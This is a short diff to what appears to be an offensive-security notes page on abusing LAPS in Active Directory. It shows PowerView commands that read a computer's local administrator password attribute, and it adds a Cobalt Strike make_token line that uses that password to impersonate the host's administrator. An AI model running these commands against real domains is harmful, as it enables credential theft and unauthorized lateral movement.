@@ -41,6 +41,10 @@ Find-AdmPwdExtendedRights
 
 # To read the ms-Mcs-AdmPwd attribute of a computer.
 Get-DomainComputer -Identity $hostname -Properties ms-Mcs-AdmPwd
+
+# You can now impersonate the local administrator of the target host.
+# With Cobalt Strike, do following command.
+make_token .\LapsAdmin $msMcsAdmPwd
 ```
 
 ## Persistence
